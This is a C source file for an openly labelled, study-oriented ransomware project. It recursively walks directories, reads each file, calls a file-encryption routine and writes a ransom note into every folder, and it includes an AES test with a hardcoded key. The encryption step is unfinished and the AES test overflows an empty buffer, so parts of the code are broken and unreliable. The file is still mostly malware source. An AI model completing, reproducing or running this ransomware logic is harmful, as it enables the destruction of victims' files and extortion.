// Standard libraries
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <regex.h>

// External libraries
#include "log.h"
#include "aes.h"


// Configuration - BEGIN
#define DEBUG_MODE true
#define RNOTE_FILENAME "R34D_TH1S!!!.txt"
char *ignoreExtensions[] = {"\\.mkv$", "\\.mlt$"};
char *ignoreDirectories[] = {".", "..", "/"};
char *ransomNote = "RANSOM NOTE!!!\nAll your important files were encrypted.\nI hope the ransomware was executed in a Virtual Machine, otherwise you are fuck3d!\n--------------\nThis is the m4ld3v ransom note.\nm4ld3v is an open-source project created for studying purposes.\n\nMore information about the project at: https://github.com/felipetarijon/m4ld3v\n\nSecurity concerns: https://github.com/felipetarijon/m4ld3v/blob/master/SECURITY.MD\n\nDISCLAIMER:\n* Do not attempt to violate the law with anything contained here.\n* Do not use the tool for illegal purposes.\n* The author(s) of this project is/are not responsible for any illegal actions.\n\n\nCheers!";
// Configuration - END


bool regexMatch(const char *rePattern, const char *strSubstring)
{
    regex_t regex;
    int reti;
    char msgbuf[100];
    bool result = false;

    /* Compile regular expression */
    reti = regcomp(&regex, rePattern, 0);
    if (reti) {
        fprintf(stderr, "Could not compile regex\n");
    }

    /* Execute regular expression */
    reti = regexec(&regex, strSubstring, 0, NULL, 0);
    if (!reti)
    {
        result = true;
    }
    else
    {
        result = false;
        regerror(reti, &regex, msgbuf, sizeof(msgbuf));
    }

    /* Free memory allocated to the pattern buffer by regcomp() */
    regfree(&regex);

    return result;
}

bool isIgnoredDirectory(const char *dirName)
{
    /**
     * Checks if a directory name is in the ignoreDirectories list (variable).
     * @param char* directory name.
     * @return bool
     */
    for (int i = 0; i < (sizeof(ignoreDirectories) / sizeof(ignoreDirectories[0])); i++)
    {
        if (strcmp(dirName, ignoreDirectories[i]) == 0)
        {
            return true;
        }
    }

    return false;
}

bool isIgnoredExtension(const char *fileName)
{
    /**
     * Checks if a file name contains a file extension in the ignoreExtensions list (variable).
     * @param char* file name.
     * @return bool
     */
    for (int i = 0; i < (sizeof(ignoreExtensions) / sizeof(ignoreExtensions[0])); i++)
    {
        if (regexMatch(ignoreExtensions[i], fileName))
        {
            return true;
        }
    }

    return false;
}

long long int getFileSize(const char *filePath)
{
    struct stat st;
    stat(filePath, &st);
    return (long long int)st.st_size;
}

int isDirectory(const char *path)
{
    /**
     * Checks if a specific path is a directory.
     * @param char* directory path.
     * @return bool
     */
    struct stat statbuf;

    if (stat(path, &statbuf) != 0)
    {
        return 0;
    }

    return S_ISDIR(statbuf.st_mode);
}

bool createRansomNote(const char *filePath)
{
    /**
     * Creates a ransom note based on ransomNote variable.
     * @param char* ransom note file path (including file name and extension).
     * @return bool true = created successfuly; false = not created
     */
    if (access(filePath, F_OK) == 0) {
        log_debug("Ransom note already exists in the path: %s", filePath);
        return false;
    }

    FILE *fp = fopen(filePath, "w");
    if (fp == NULL)
    {
        log_error("Error while creating ransom note at: %s", filePath);
       return false; 
    }
    fprintf(fp, "%s", ransomNote);
    log_debug("Ransom note created at %s.", filePath);
    fclose(fp);
    return true;
}

char *readFileContent(const char *filePath)
{
    /**
     * Read a file content writing it to a buffer with the same file size.
     * IMPORTANT: It's mandatory to free the buffer after calling this function.
     * Reference: https://cplusplus.com/reference/cstdio/fread/
     * Note: This was not tested with large files. This may need a refactor to handle files in chunks.
     * @param char* file path.
     * @return char *
     */

    long long int fileSize = getFileSize(filePath);
    char * buffer;
    size_t result;

    log_debug("file: %s (%lld bytes)", filePath, fileSize);

    // Opening file
    FILE *fp = fopen(filePath, "rb");
    if ( fp == NULL ) {log_error("Error opening the file %s", filePath);}

    // Allocating memory
    buffer = (char*) malloc(sizeof(char)*fileSize);
    if (buffer == NULL) {fputs("Memory error", stderr); exit (2);}

    // Reading file content into allocated memory
    result = fread(buffer, 1, fileSize,fp);
    if (result != fileSize) {fputs ("Reading error", stderr); exit (3);}

    // Closing file pointer
    fclose(fp);

    return buffer;
}

bool encryptFile(const char* filePath)
{
    /**
     * Encrypt a file content.
     * IMPORTANT: This was not tested with large files. This may need a refactor to handle files in chunks.
     * @param char* file path.
     * @return bool
     */

    long long int fileSize = getFileSize(filePath);
    char * buffer;
    size_t result;

    log_debug("file: %s (%lld bytes)", filePath, fileSize);

    // Opening file
    FILE *fp = fopen(filePath, "r+b");
    if ( fp == NULL ) {log_error("Error opening the file %s", filePath);}

    // Allocating memory
    buffer = (char*) malloc(sizeof(char)*fileSize);
    if (buffer == NULL) {fputs("Memory error", stderr); exit (2);}

    // Reading file content into allocated memory
    result = fread(buffer, 1, fileSize,fp);
    if (result != fileSize) {fputs ("Reading error", stderr); exit (3);}

    // Closing file pointer
    fclose(fp);
    free(buffer);

    return true;
}

void encTest()
{
    struct AES_ctx ctx;

    uint8_t key[] = {
        0x01,0x02,0x03,0x04,
        0x04,0x03,0x02,0x01,
        0x01,0x02,0x03,0x04,
        0x04,0x03,0x02,0x01
    };

    uint8_t iv[] = {
        0x01,0x02,0x03,0x04,
        0x04,0x03,0x02,0x01,
        0x01,0x02,0x03,0x04,
        0x07,0x07,0x07,0x07
    };

    uint8_t buf[] = {};

    for (int i = 0; i < sizeof(buf); i++)
    {
        printf("%c", buf[i]);
    }
    printf("\n");

    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_encrypt_buffer(&ctx, buf, 4000);

    log_debug("sizeof(buf): %d", sizeof(buf));

    for (int i = 0; i < sizeof(buf); i++)
    {
        printf("%x", buf[i]);
    }
    printf("\n");

    AES_CBC_decrypt_buffer(&ctx, buf, 4000);

    for (int i = 0; i < sizeof(buf); i++)
    {
        printf("%c", buf[i]);
    }
    printf("\n");
}

void runRansom(const char *path, bool recursive)
{
    /**
     * Run Ransomware main logic.
     * Lists the directory's content recursively or not.
     * @param char* path the directory's path.
     * @param bool recursive if it finds a dir, it processes it recursively.
     * @return void
     */

    log_debug("Checking path: %s", path);

    DIR *dp;
    struct dirent *ep;

    dp = opendir(path);
    if (dp != NULL)
    {
        while ((ep = readdir(dp)))
        {
            // ignores if the directory is in the ignoreDirectories list
            if (!isIgnoredDirectory(ep->d_name))
            {
                char fullPath[PATH_MAX];
                strcpy(fullPath, path);
                // only concats if the path has not already an ending "/"
                if (path[strlen(path) - 1] != '/')
                {
                    strcat(fullPath, "/");
                }
                strcat(fullPath, ep->d_name);

                if (isDirectory(fullPath))
                {
                    log_debug("folder: %s", ep->d_name);

                    if (recursive)
                    {
                        runRansom(fullPath, true);
                    }
                }
                else // if it's a file
                {
                    if (!isIgnoredExtension(ep->d_name) && strcmp(RNOTE_FILENAME, ep->d_name) != 0)
                    {
                        char *bufferFileRead = readFileContent(fullPath);
                        log_debug("bufferFileRead = %s", bufferFileRead);

                        // release buffer after using it
                        free(bufferFileRead);

                        // rename file:
                        // rename(old, new);
                        encryptFile(fullPath);

                        // ransom note creation
                        char rNoteName[PATH_MAX];
                        strcpy(rNoteName, path);
                        // only concats if the path has not already an ending /
                        if (path[strlen(path) - 1] != '/')
                        {
                            strcat(rNoteName, "/");
                        }
                        strcat(rNoteName, RNOTE_FILENAME);
                        createRansomNote(rNoteName);
                    }
                }
            }
        }
        closedir(dp);
    }
    else
    {
        perror("Couldn't open the directory");
    }
    printf("\n");
}

int main()
{
    clock_t tic = clock();

#if DEBUG_MODE
    FILE *fp = fopen("output.txt", "w+");
    log_add_fp(fp, LOG_DEBUG);
#endif

    //runRansom("/home/<USER>/test", false);
    encTest();

    clock_t toc = clock();
    log_debug("Elapsed: %f seconds", (double)(toc - tic) / CLOCKS_PER_SEC);

#if DEBUG_MODE
    fclose(fp);
#endif

    return EXIT_SUCCESS;
}
